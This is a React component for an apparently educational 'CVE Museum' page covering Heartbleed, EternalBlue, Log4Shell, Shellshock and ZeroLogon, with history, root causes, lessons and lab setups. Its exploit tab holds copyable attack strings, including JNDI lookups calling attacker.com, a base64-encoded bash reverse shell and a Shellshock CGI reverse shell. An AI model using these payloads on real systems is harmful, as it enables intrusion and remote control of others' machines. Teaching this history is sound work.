import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Library, Clock, Search, Filter,
    Info, Code, Box, BookOpen,
    ExternalLink, ChevronRight, X,
    Shield, AlertTriangle, Lightbulb,
    PlayCircle, Download, Calendar, Check,
    TrendingUp, Zap, GitBranch, FileJson, Terminal, Bug
} from 'lucide-react';

const CVEMuseum = () => {
    const [selectedCVE, setSelectedCVE] = useState(null);
    const [activeTab, setActiveTab] = useState('overview');
    const [searchQuery, setSearchQuery] = useState('');
    const [filter, setFilter] = useState({ year: 'all', category: 'all' });
    const [copied, setCopied] = useState(false);
    const [selectedVariant, setSelectedVariant] = useState(0);

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const cves = [
        {
            id: 'CVE-2014-0160',
            name: 'Heartbleed',
            icon: '💔',
            year: 2014,
            severity: 'HIGH',
            cvss: 7.5,
            category: 'Memory Leak',
            affected: 'OpenSSL 1.0.1 - 1.0.1f',
            summary: 'A critical buffer over-read vulnerability in the OpenSSL cryptography library. It allows attackers to eavesdrop on communications and steal data directly from the services\' memory.',
            discoveryTimeline: [
                { date: 'Apr 1, 2014', event: 'Discovered by Codenomicon and Neel Mehta (Google Security)' },
                { date: 'Apr 3, 2014', event: 'CloudFlare notified to test early patches' },
                { date: 'Apr 7, 2014', event: 'Public disclosure and mass emergency patching begins' }
            ],
            impactEvolution: [
                { year: '2014', status: 'Immediate exposure of 17.5% of SSL-enabled servers (approx. 500,000).' },
                { year: '2015', status: 'Community Health Report shows 200,000 servers still unpatched after 1 year.' },
                { year: '2024', status: 'Historical benchmark for large-scale internet vulnerability management.' }
            ],
            detailedImpact: {
                technical: 'Exploitation involves sending a malformed heartbeat request with a small payload but large length field. OpenSSL fails to validate this, returning 64KB of server memory.',
                business: 'Exposed master private keys, session tokens, and user credentials. Required global rotation of SSL certificates.'
            },
            rootCause: 'Lack of bounds checking in the `dtls1_process_heartbeat` and `tls1_process_heartbeat` functions in OpenSSL.',
            technicalAnalysis: 'The heartbeat response buffer is allocated based on the attacker-supplied length field without verifying it against the actual received payload length. This leads to information disclosure from the process memory heap.',
            poc: `# Heartbleed Memory Leaker\nimport socket\n\ndef leak_memory(host, port=443):\n    # TLS Heartbeat Payload (exploiting 64KB leak)\n    payload = (b'\\x18\\x03\\x02\\x00\\x03' # Heartbeat record\n               b'\\x01\\xff\\xff')      # Type 1 (request), Length 65535\n    \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(payload)\n    return s.recv(65535)\n\n# Educational Usage Only`,
            variants: [
                { name: 'Nmap Script', cmd: 'nmap -p 443 --script ssl-heartbleed <target>' },
                { name: 'Metasploit', cmd: 'use auxiliary/scanner/ssl/openssl_heartbleed' }
            ],
            docker: 'vulnerables/cve-2014-0160',
            lesson: 'Always trust, then verify. Input validation is the first line of defense against memory-unsafe languages.'
        },
        {
            id: 'CVE-2017-0144',
            name: 'EternalBlue',
            icon: '🔵',
            year: 2017,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'SMB RCE',
            affected: 'Windows Vista - Windows Server 2008 R2',
            summary: 'A devastating remote code execution vulnerability in Microsoft\'s SMBv1 protocol. Developed by the NSA (as EternalBlue) and leaked by the Shadow Brokers.',
            discoveryTimeline: [
                { date: 'Mar 14, 2017', event: 'Microsoft releases MS17-010 patch' },
                { date: 'Apr 14, 2017', event: 'Shadow Brokers leak EternalBlue exploit' },
                { date: 'May 12, 2017', event: 'WannaCry ransomware global outbreak begins' }
            ],
            impactEvolution: [
                { year: '2017', status: 'WannaCry infects 200,000+ computers in 150 countries in days.' },
                { year: '2018', status: 'NotPetya uses EternalBlue for multi-billion dollar damage.' },
                { year: 'Today', status: 'Still actively used in lateral movement during APT campaigns.' }
            ],
            detailedImpact: {
                technical: 'Exploits a buffer overflow in the SRV.SYS driver via malformed SMB packets, allowing ring-0 code execution.',
                business: 'Estimated $4B - $10B in global economic damage. Crippled the UK NHS and Maersk shipping.'
            },
            rootCause: 'Mathematical error in SMBv1 transaction handling where the data size was not correctly validated against the buffer size.',
            technicalAnalysis: 'The exploit sends a FEA (File Extended Attribute) list that overflows a kernel buffer when processed by the Srv.sys driver. It uses grooming techniques to ensure predictable memory layout for the payload.',
            poc: `msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target_ip>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit`,
            variants: [
                { name: 'AutoBlue', desc: 'Python-based EternalBlue exploit suite' },
                { name: 'FuzzBunch', desc: 'Original NSA exploitation framework' }
            ],
            docker: 'Windows VM required',
            lesson: 'Legacy protocols are debt. If you don\'t need SMBv1, disable it permanently.'
        },
        {
            id: 'CVE-2021-44228',
            name: 'Log4Shell',
            icon: '📝',
            year: 2021,
            severity: 'CRITICAL',
            cvss: 10.0,
            category: 'Java RCE',
            affected: 'Apache Log4j 2.0-beta9 to 2.14.1',
            summary: 'A high-impact JNDI injection vulnerability in Log4j. Attackers can execute arbitrary code by sending a crafted string that gets logged by the application.',
            discoveryTimeline: [
                { date: 'Nov 24, 2021', event: 'Chen Zhaojun (Alibaba Cloud) reports flaw to Apache' },
                { date: 'Dec 9, 2021', event: 'Public disclosure via Twitter' },
                { date: 'Dec 10, 2021', event: 'Exploitation attempts skyrocket globally' }
            ],
            impactEvolution: [
                { year: '2021', status: 'Zero-day exploitation observed in Minecraft and major cloud providers.' },
                { year: '2022', status: 'Widespread integration into ransomware and nation-state toolkits.' },
                { year: 'Long Term', status: 'Considered one of the most severe vulnerabilities in internet history.' }
            ],
            detailedImpact: {
                technical: 'Allows RCE via JNDI lookups (LDAP/RMI/DNS). Any user-controllable input that gets logged can trigger it.',
                business: 'Extreme remediation cost. Affected virtually every enterprise environment using Java.'
            },
            rootCause: 'Log4j standard message formatters allowed recursive lookups, including JNDI connections to remote servers.',
            technicalAnalysis: 'By using the syntax `$\{jndi:ldap://attacker.com/a}`, log4j triggers a lookup to the attacker\'s server, which returns a malicious Java class that is then executed in the context of the logging application.',
            poc: `# Simple Header Injection\ncurl -H 'User-Agent: $\{jndi:ldap://attacker.com/exp\}' http://target:8080/\n\n# Base64 Encoded Variant\n$\{jndi:ldap://attacker.com/$\{base64:YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=\}\}`,
            variants: [
                { name: 'LDAP Reflector', desc: 'Custom LDAP server to serve malicious objects' },
                { name: 'WAF Bypass', desc: 'Using nested lookups like $\{jndi:$\{lower:l\}dap...}' }
            ],
            docker: 'ghcr.io/christophetd/log4shell-vulnerable-app',
            lesson: 'Logging should be a passive action. Never allow active lookups or execution during log processing.'
        },
        {
            id: 'CVE-2014-6271',
            name: 'Shellshock',
            icon: '💥',
            year: 2014,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'Bash RCE',
            affected: 'GNU Bash through 4.3',
            summary: 'A vulnerability in GNU Bash that allows attackers to execute arbitrary commands via environment variables. It heavily affected web servers using CGI.',
            discoveryTimeline: [
                { date: 'Sep 12, 2014', event: 'Stéphane Chazelas discovers the flaw' },
                { date: 'Sep 24, 2014', event: 'Public disclosure and Red Hat advisory' },
                { date: 'Sep 25, 2014', event: 'Widespread botnet exploitation observed' }
            ],
            impactEvolution: [
                { year: '2014', status: 'Immediate exploitation of CGI scripts to build massive botnets (Mayhem).' },
                { year: '2015', status: 'Shift toward attacking IoT devices and embedded systems.' },
                { year: '2024', status: 'Used as a classic example of environment variable injection.' }
            ],
            detailedImpact: {
                technical: 'Exploits Bash\'s ability to store function definitions in environment variables. Maliciously crafted variables trigger code execution when Bash is invoked.',
                business: 'Required patching millions of Linux servers. High risk for legacy web infrastructure.'
            },
            rootCause: 'Bash continued parsing and executing commands after reaching the end of a function definition in an environment variable.',
            technicalAnalysis: 'The vulnerability exists because Bash processes function definitions provided in environment variables incorrectly, allowing trailing commands to be executed in the context of the shell process.',
            poc: `env x='() { :;}; echo VULNERABLE' bash -c "echo test"\n\n# CGI Injection Variant\ncurl -H "User-Agent: () { :; }; /bin/eject" http://example.com/cgi-bin/test.cgi`,
            variants: [
                { name: 'Direct Bash', cmd: "env x='() { :;}; echo VULNERABLE' bash -c \"echo test\"" },
                { name: 'CGI RCE', cmd: 'curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" http://target/cgi-bin/status' }
            ],
            docker: 'vulnerables/cve-2014-6271',
            lesson: 'Never pass untrusted input to an interpreter. Environment variables are a hidden attack surface.'
        },
        {
            id: 'CVE-2020-1472',
            name: 'ZeroLogon',
            icon: '🔓',
            year: 2020,
            severity: 'CRITICAL',
            cvss: 10.0,
            category: 'AD PrivEsc',
            affected: 'Windows Server 2008 - 2019',
            summary: 'A cryptographic flaw in the Netlogon Remote Protocol (MS-NRPC). It allows an attacker to impersonate any computer, including the Domain Controller.',
            discoveryTimeline: [
                { date: 'Aug 11, 2020', event: 'Microsoft releases initial patch' },
                { date: 'Sep 11, 2020', event: 'Secura publishes technical whitepaper' },
                { date: 'Sep 14, 2020', event: 'Public exploits released on GitHub' }
            ],
            impactEvolution: [
                { year: '2020', status: 'CISA issues emergency directive to patch within 4 days.' },
                { year: '2021', status: 'Widely used by Ransomware operators for lateral movement.' },
                { year: 'Today', status: 'Essential test case for Active Directory security audits.' }
            ],
            detailedImpact: {
                technical: 'Bypasses authentication by exploiting a weak AES-CFB8 implementation, allowing an attacker to set a new password for the DC machine account.',
                business: 'Complete compromise of Active Directory forests. Total loss of trust in the corporate network.'
            },
            rootCause: 'Improper use of an all-zero Initialization Vector (IV) in the AES-CFB8 encryption used by Netlogon.',
            technicalAnalysis: 'By sending enough authentication attempts (approx. 256) with an all-zero client challenge, the attacker can eventually hit a case where the server\'s computed session key also results in an all-zero ciphertext, bypassing authentication.',
            poc: `# ZeroLogon Tester (Secura)\npython3 zerologon_tester.py <DC_NETBIOS_NAME> <DC_IP_ADDR>\n\n# Reset DC Password (Impacket)\npython3 examples/secretsdump.py -hashes :<nt_hash> <domain>/<dc_name>\\$@<dc_ip>`,
            variants: [
                { name: 'Tester', cmd: 'python3 zerologon_tester.py DC01 192.168.1.10' },
                { name: 'Exploit', cmd: 'python3 set_password.py DC01 192.168.1.10' }
            ],
            docker: 'Requires AD Lab',
            lesson: 'Cryptography is hard. Never roll your own, and always use standard, well-vetted libraries and IVs.'
        }
    ];

    const filteredCVEs = cves.filter(c => {
        const matchesSearch = c.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
            c.id.toLowerCase().includes(searchQuery.toLowerCase());
        const matchesYear = filter.year === 'all' || c.year.toString() === filter.year;
        const matchesCat = filter.category === 'all' || c.category === filter.category;
        return matchesSearch && matchesYear && matchesCat;
    });

    const years = [...new Set(cves.map(c => c.year))].sort();
    const categories = [...new Set(cves.map(c => c.category))];

    return (
        <div className="min-h-screen bg-[#0a0a0f] text-gray-100 p-4 md:p-8 font-['Outfit']">
            <div className="max-w-6xl mx-auto">
                {/* Header */}
                <div className="text-center mb-16">
                    <motion.div
                        initial={{ opacity: 0, scale: 0.9 }}
                        animate={{ opacity: 1, scale: 1 }}
                        className="inline-flex items-center gap-3 px-6 py-2 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 mb-6"
                    >
                        <Library size={18} />
                        <span className="text-sm font-bold tracking-widest uppercase">Historical Vulnerability Archive</span>
                    </motion.div>
                    <h1 className="text-5xl md:text-6xl font-black mb-4 tracking-tighter">
                        CVE <span className="text-blue-500">Museum</span>
                    </h1>
                    <p className="text-gray-500 text-lg md:text-xl font-['Noto_Sans_Arabic'] opacity-80">
                        متحف الثغرات - التاريخ يعيد نفسه
                    </p>
                </div>

                {/* Timeline Navigation */}
                <div className="relative mb-12 p-8 rounded-3xl bg-[#12121e] border border-white/5 overflow-hidden">
                    <div className="absolute top-0 right-0 p-4 opacity-5 rotate-12">
                        <Clock size={120} />
                    </div>
                    <h3 className="text-sm font-bold text-gray-500 uppercase tracking-[0.2em] mb-8">Evolution of Impact</h3>
                    <div className="flex items-center justify-between gap-4 overflow-x-auto no-scrollbar pb-4">
                        {years.map(year => {
                            const count = cves.filter(c => c.year === year).length;
                            return (
                                <button
                                    key={year}
                                    onClick={() => setFilter({ ...filter, year: year.toString() })}
                                    className={`flex flex-col items-center gap-2 min-w-[80px] group transition-all ${filter.year === year.toString() ? 'scale-110' : ''}`}
                                >
                                    <div className={`w-3 h-3 rounded-full transition-all ${filter.year === year.toString() ? 'bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.8)]' : 'bg-white/10 group-hover:bg-white/30'}`} />
                                    <span className={`text-lg font-black ${filter.year === year.toString() ? 'text-white' : 'text-gray-600'}`}>{year}</span>
                                    <span className="text-[10px] text-gray-700 font-bold uppercase">{count} CVE{count > 1 ? 's' : ''}</span>
                                </button>
                            );
                        })}
                    </div>
                </div>

                {/* Filters & Search */}
                <div className="flex flex-col lg:flex-row gap-4 mb-12">
                    <div className="relative flex-1 group">
                        <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 group-focus-within:text-blue-500 transition-all" size={20} />
                        <input
                            type="text"
                            placeholder="Search the archives..."
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            className="w-full bg-[#12121e] border border-white/5 rounded-2xl pl-12 pr-6 py-4 focus:outline-none focus:border-blue-500/50 transition-all font-semibold"
                        />
                    </div>
                    <div className="flex gap-4">
                        <select
                            value={filter.category}
                            onChange={(e) => setFilter({ ...filter, category: e.target.value })}
                            className="bg-[#12121e] border border-white/5 rounded-2xl px-6 py-4 focus:outline-none text-sm font-bold text-gray-400"
                        >
                            <option value="all">All Categories</option>
                            {categories.map(c => <option key={c} value={c}>{c}</option>)}
                        </select>
                        <button
                            onClick={() => {
                                setSearchQuery('');
                                setFilter({ year: 'all', category: 'all' });
                            }}
                            className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-500 hover:text-white transition-all"
                        >
                            <Filter size={20} />
                        </button>
                    </div>
                </div>

                {/* Archive Grid */}
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                    {filteredCVEs.map((cve) => (
                        <motion.div
                            key={cve.id}
                            layoutId={cve.id}
                            onClick={() => {
                                setSelectedCVE(cve);
                                setActiveTab('overview');
                            }}
                            className="group relative h-[380px] p-8 rounded-[2.5rem] bg-[#12121e] border border-white/5 hover:border-blue-500/30 transition-all cursor-pointer overflow-hidden flex flex-col"
                        >
                            {/* Background Pattern */}
                            <div className="absolute -top-12 -right-12 w-32 h-32 bg-blue-500/10 blur-[50px] rounded-full group-hover:bg-blue-500/20 transition-all" />

                            <div className="text-5xl mb-6">{cve.icon}</div>

                            <div className="flex justify-between items-start mb-4">
                                <div className="font-mono text-xs font-black text-blue-500 tracking-widest">{cve.id}</div>
                                <div className="text-[10px] font-bold text-gray-600 uppercase tracking-widest">{cve.category}</div>
                            </div>

                            <h3 className="text-2xl font-black mb-4 group-hover:text-blue-400 transition-colors line-clamp-1">{cve.name}</h3>
                            <p className="text-gray-500 text-sm leading-relaxed line-clamp-3 mb-auto">
                                {cve.summary}
                            </p>

                            <div className="flex items-center justify-between pt-6 mt-6 border-t border-white/5">
                                <div className="flex items-center gap-2">
                                    <Calendar size={14} className="text-gray-700" />
                                    <span className="text-xs font-bold text-gray-600">{cve.year}</span>
                                </div>
                                <div className="flex items-center gap-1 group-hover:translate-x-1 transition-transform">
                                    <span className="text-[10px] font-black uppercase tracking-widest text-blue-500">Exhibit Details</span>
                                    <ChevronRight size={14} className="text-blue-500" />
                                </div>
                            </div>
                        </motion.div>
                    ))}
                </div>

                {/* Exhibit Detail Modal */}
                <AnimatePresence>
                    {selectedCVE && (
                        <motion.div
                            initial={{ opacity: 0 }}
                            animate={{ opacity: 1 }}
                            exit={{ opacity: 0 }}
                            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-[#0a0a0f]/95 backdrop-blur-xl"
                            onClick={() => setSelectedCVE(null)}
                        >
                            <motion.div
                                layoutId={selectedCVE.id}
                                className="w-full max-w-4xl max-h-[90vh] bg-[#12121e] rounded-[3rem] border border-white/10 overflow-hidden shadow-2xl flex flex-col"
                                onClick={e => e.stopPropagation()}
                            >
                                {/* Header */}
                                <div className="p-8 md:p-12 pb-6 flex justify-between items-start">
                                    <div className="flex gap-6 items-center">
                                        <div className="text-6xl">{selectedCVE.icon}</div>
                                        <div>
                                            <div className="font-mono text-sm font-bold text-blue-500 tracking-tighter mb-1">{selectedCVE.id}</div>
                                            <h2 className="text-4xl font-black text-white">{selectedCVE.name}</h2>
                                        </div>
                                    </div>
                                    <button
                                        onClick={() => setSelectedCVE(null)}
                                        className="p-3 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-500 transition-all"
                                    >
                                        <X size={24} />
                                    </button>
                                </div>

                                {/* Tabs */}
                                <div className="px-12 flex border-b border-white/5 overflow-x-auto no-scrollbar">
                                    {[
                                        { id: 'overview', label: 'History & Impact', icon: Info },
                                        { id: 'poc', label: 'Exploit/PoC', icon: Code },
                                        { id: 'lab', label: 'Interactive Lab', icon: Box },
                                        { id: 'resources', label: 'References', icon: BookOpen },
                                    ].map(tab => (
                                        <button
                                            key={tab.id}
                                            onClick={() => setActiveTab(tab.id)}
                                            className={`flex items-center gap-2 px-6 py-4 transition-all relative whitespace-nowrap ${activeTab === tab.id ? 'text-blue-400' : 'text-gray-500 hover:text-gray-300'
                                                }`}
                                        >
                                            <tab.icon size={16} />
                                            <span className="text-sm font-bold uppercase tracking-widest">{tab.label}</span>
                                            {activeTab === tab.id && (
                                                <motion.div
                                                    layoutId="activeTabUnderline"
                                                    className="absolute bottom-0 left-0 right-0 h-1 bg-blue-500 rounded-full"
                                                />
                                            )}
                                        </button>
                                    ))}
                                </div>

                                {/* Content */}
                                <div className="flex-1 overflow-y-auto p-12 scrollbar-thin">
                                    {activeTab === 'overview' && (
                                        <div className="space-y-16">
                                            {/* Summary Section */}
                                            <section className="relative">
                                                <div className="absolute -left-12 top-0 bottom-0 w-1 bg-gradient-to-b from-blue-500/50 to-transparent" />
                                                <h4 className="text-[10px] font-black text-blue-500 uppercase tracking-[0.4em] mb-4">Executive Brief</h4>
                                                <p className="text-2xl text-white leading-relaxed font-semibold max-w-2xl">{selectedCVE.summary}</p>
                                            </section>

                                            {/* Evolution of Impact - Vertical Timeline */}
                                            <section>
                                                <div className="flex items-center gap-4 mb-8">
                                                    <TrendingUp className="text-red-500" size={24} />
                                                    <h4 className="text-xs font-black text-white uppercase tracking-[0.3em]">Evolution of Impact</h4>
                                                </div>
                                                <div className="space-y-8 pl-4 border-l border-white/5">
                                                    {selectedCVE.impactEvolution.map((item, idx) => (
                                                        <div key={idx} className="relative pl-8">
                                                            <div className="absolute left-[-1.15rem] top-1 w-3 h-3 rounded-full bg-red-500 shadow-[0_0_10px_rgba(239,68,68,0.5)]" />
                                                            <div className="text-xs font-black text-red-400 mb-1">{item.year}</div>
                                                            <p className="text-gray-400 text-sm leading-relaxed">{item.status}</p>
                                                        </div>
                                                    ))}
                                                </div>
                                            </section>

                                            {/* Discovery Pulse - Horizontal Timeline */}
                                            <section className="p-10 rounded-[2.5rem] bg-white/5 border border-white/5">
                                                <div className="flex items-center gap-4 mb-10">
                                                    <Zap className="text-yellow-500" size={20} />
                                                    <h4 className="text-[10px] font-black text-white uppercase tracking-[0.3em]">Discovery Pulse</h4>
                                                </div>
                                                <div className="grid grid-cols-1 md:grid-cols-3 gap-8 relative">
                                                    <div className="hidden md:block absolute top-[1.1rem] left-0 right-0 h-[1px] bg-white/10" />
                                                    {selectedCVE.discoveryTimeline.map((step, idx) => (
                                                        <div key={idx} className="relative">
                                                            <div className="w-10 h-10 rounded-2xl bg-[#0a0a0f] border border-white/10 flex items-center justify-center text-blue-500 mb-4 mx-auto relative z-10">
                                                                <div className="text-xs font-black">{idx + 1}</div>
                                                            </div>
                                                            <div className="text-center">
                                                                <div className="text-[10px] font-black text-blue-400 uppercase mb-1">{step.date}</div>
                                                                <div className="text-xs text-gray-300 px-4 leading-relaxed font-bold">{step.event}</div>
                                                            </div>
                                                        </div>
                                                    ))}
                                                </div>
                                            </section>

                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
                                                {/* Technical Impact */}
                                                <section className="p-8 rounded-3xl bg-blue-500/5 border border-blue-500/10">
                                                    <div className="flex items-center gap-3 mb-6">
                                                        <Terminal size={18} className="text-blue-400" />
                                                        <h4 className="text-xs font-black text-blue-400 uppercase tracking-widest">Technical Blast Radius</h4>
                                                    </div>
                                                    <p className="text-gray-400 leading-relaxed text-sm font-medium">{selectedCVE.detailedImpact.technical}</p>
                                                </section>

                                                {/* Business Impact */}
                                                <section className="p-8 rounded-3xl bg-purple-500/5 border border-purple-500/10">
                                                    <div className="flex items-center gap-3 mb-6">
                                                        <AlertTriangle size={18} className="text-purple-400" />
                                                        <h4 className="text-xs font-black text-purple-400 uppercase tracking-widest">Business Fallout</h4>
                                                    </div>
                                                    <p className="text-gray-400 leading-relaxed text-sm font-medium">{selectedCVE.detailedImpact.business}</p>
                                                </section>
                                            </div>

                                            <div className="p-8 rounded-3xl bg-emerald-500/5 border border-emerald-500/10 flex items-start gap-6">
                                                <div className="p-3 bg-emerald-500/10 rounded-2xl text-emerald-400">
                                                    <Lightbulb size={24} />
                                                </div>
                                                <div>
                                                    <h4 className="text-emerald-200 font-bold mb-1 tracking-tight">Post-Mortem Lesson</h4>
                                                    <p className="text-gray-400 text-sm leading-relaxed italic">"{selectedCVE.lesson}"</p>
                                                </div>
                                            </div>
                                        </div>
                                    )}

                                    {activeTab === 'poc' && (
                                        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                                            <div className="lg:col-span-2 space-y-8">
                                                <div className="p-6 rounded-2xl bg-orange-500/10 border border-orange-500/20 text-orange-200 flex items-center gap-4">
                                                    <AlertTriangle size={20} />
                                                    <span className="text-xs font-black tracking-widest uppercase">Research & Education Only</span>
                                                </div>
                                                <div className="flex items-center gap-2 mb-4 bg-white/5 p-2 rounded-2xl w-fit">
                                                    {selectedCVE.variants.map((v, i) => (
                                                        <button
                                                            key={i}
                                                            onClick={() => setSelectedVariant(i)}
                                                            className={`px-4 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${selectedVariant === i ? 'bg-blue-600 text-white shadow-lg shadow-blue-500/20' : 'text-gray-500 hover:text-white'}`}
                                                        >
                                                            {v.name}
                                                        </button>
                                                    ))}
                                                </div>
                                                <div className="relative group">
                                                    <div className="absolute top-4 right-4 z-10 flex gap-2">
                                                        <button
                                                            onClick={() => copyToClipboard(selectedVariant === 0 ? selectedCVE.poc : selectedCVE.variants[selectedVariant].cmd)}
                                                            className={`p-3 rounded-2xl transition-all ${copied ? 'bg-green-500 text-white' : 'bg-white/10 hover:bg-white/20 text-white'}`}
                                                        >
                                                            {copied ? <Check size={18} /> : <Download size={18} />}
                                                        </button>
                                                    </div>
                                                    <pre className="p-8 rounded-[2.5rem] bg-[#0a0a0f] border border-white/5 font-mono text-sm leading-relaxed overflow-x-auto text-blue-300">
                                                        {selectedVariant === 0 ? selectedCVE.poc : selectedCVE.variants[selectedVariant].cmd}
                                                    </pre>
                                                </div>
                                            </div>

                                            <div className="space-y-8 lg:border-l lg:border-white/5 lg:pl-8">
                                                <section>
                                                    <div className="flex items-center gap-3 mb-6">
                                                        <Bug size={18} className="text-blue-500" />
                                                        <h4 className="text-[10px] font-black text-white uppercase tracking-[0.3em]">Technical Analysis</h4>
                                                    </div>
                                                    <p className="text-gray-400 text-xs leading-relaxed font-bold">
                                                        {selectedCVE.technicalAnalysis}
                                                    </p>
                                                </section>

                                                <section>
                                                    <div className="flex items-center gap-3 mb-6">
                                                        <Shield size={18} className="text-green-500" />
                                                        <h4 className="text-[10px] font-black text-white uppercase tracking-[0.3em]">Payload Strategy</h4>
                                                    </div>
                                                    <div className="space-y-3">
                                                        {['Heap Spraying', 'Memory Alignment', 'Return-Oriented Programming'].map(t => (
                                                            <div key={t} className="flex items-center gap-2 text-[10px] text-gray-500 font-bold uppercase tracking-widest bg-white/5 p-3 rounded-xl border border-white/5">
                                                                <div className="w-1.5 h-1.5 rounded-full bg-green-500" />
                                                                {t}
                                                            </div>
                                                        ))}
                                                    </div>
                                                </section>
                                            </div>
                                        </div>
                                    )}

                                    {activeTab === 'lab' && (
                                        <div className="space-y-8">
                                            <div className="p-10 rounded-[2.5rem] bg-gradient-to-br from-[#1a1c2e] to-[#0a0a0f] border border-blue-500/10 text-center">
                                                <Box size={48} className="mx-auto mb-6 text-blue-500 opacity-50" />
                                                <h3 className="text-2xl font-black mb-4">Provision Environment</h3>
                                                <p className="text-gray-400 mb-8 max-w-md mx-auto">
                                                    Self-host this exhibit using Docker to practice testing for {selectedCVE.id} in a controlled environment.
                                                </p>

                                                {selectedCVE.docker.includes('/') ? (
                                                    <div className="flex items-center gap-4 max-w-lg mx-auto p-4 bg-black/40 rounded-2xl border border-white/5 font-mono text-sm text-blue-400 overflow-hidden">
                                                        <div className="flex-1 truncate">docker run -d {selectedCVE.docker}</div>
                                                        <button
                                                            onClick={() => copyToClipboard(`docker run -d ${selectedCVE.docker}`)}
                                                            className={`p-2 rounded-lg transition-all ${copied ? 'bg-green-500 text-white' : 'hover:bg-white/5'}`}
                                                        >
                                                            {copied ? <Check size={16} /> : <Download size={16} />}
                                                        </button>
                                                    </div>
                                                ) : (
                                                    <div className="text-yellow-500/70 text-sm font-bold flex items-center justify-center gap-2">
                                                        <Shield size={16} /> {selectedCVE.docker}
                                                    </div>
                                                )}
                                            </div>
                                        </div>
                                    )}

                                    {activeTab === 'resources' && (
                                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                                            {[
                                                { t: 'Walkthrough Video', d: 'Detailed analysis of the flaw', i: PlayCircle, l: `https://www.youtube.com/results?search_query=${selectedCVE.id}+walkthrough` },
                                                { t: 'Original Advisory', d: 'Technical vulnerability report', i: BookOpen, l: `https://nvd.nist.gov/vuln/detail/${selectedCVE.id}` },
                                                { t: 'MITRE ATT&CK', d: 'Technique mapping', i: Shield, l: `https://attack.mitre.org/search/?q=${selectedCVE.category}` },
                                                { t: 'Safety Patches', d: 'How vendors addressed it', i: Lightbulb, l: `https://google.com/search?q=${selectedCVE.id}+patch+analysis` },
                                            ].map(r => (
                                                <a key={r.t} href={r.l} className="group p-6 rounded-3xl bg-white/5 border border-white/5 hover:border-blue-500/30 transition-all flex items-center gap-6">
                                                    <div className="p-4 bg-white/5 group-hover:bg-blue-500/10 rounded-2xl text-gray-400 group-hover:text-blue-400 transition-all">
                                                        <r.i size={24} />
                                                    </div>
                                                    <div className="flex-1">
                                                        <div className="text-sm font-black text-white">{r.t}</div>
                                                        <div className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{r.d}</div>
                                                    </div>
                                                    <ExternalLink size={16} className="text-gray-700 group-hover:text-blue-500 transition-colors" />
                                                </a>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            </motion.div>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </div>
    );
};

export default CVEMuseum;
